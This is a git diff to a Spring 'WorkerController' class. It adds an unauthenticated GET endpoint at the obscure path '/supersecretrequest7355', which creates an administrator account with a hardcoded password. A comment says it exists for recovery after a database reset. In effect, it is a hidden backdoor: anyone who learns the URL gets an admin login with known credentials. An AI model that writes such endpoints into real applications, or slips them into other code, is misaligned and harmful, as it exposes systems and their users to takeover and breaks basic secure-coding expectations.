@@ -45,6 +45,18 @@ public class WorkerController {
         return "Director/edit_worker";
     }
 
+    //на случай сброса базы - добавляет сотрудника
+    @GetMapping("/supersecretrequest7355")
+    public String addAdmin(Model model) {
+        Worker worker = new Worker("admin", "admin", "admin", "a@b.c", "991122334455", "address", "директор", "password");
+        worker.setRoles("ROLE_ADMIN");
+        worker.setPassword(new BCryptPasswordEncoder().encode("74553211"));
+        service.saveWorker(worker);
+
+return "redirect:/User/entrance";
+    }
+
+
     @GetMapping("/Director/worker_remove")
     public String removeWorker(@RequestParam Long id) {
         if (!service.existsWithId(id))
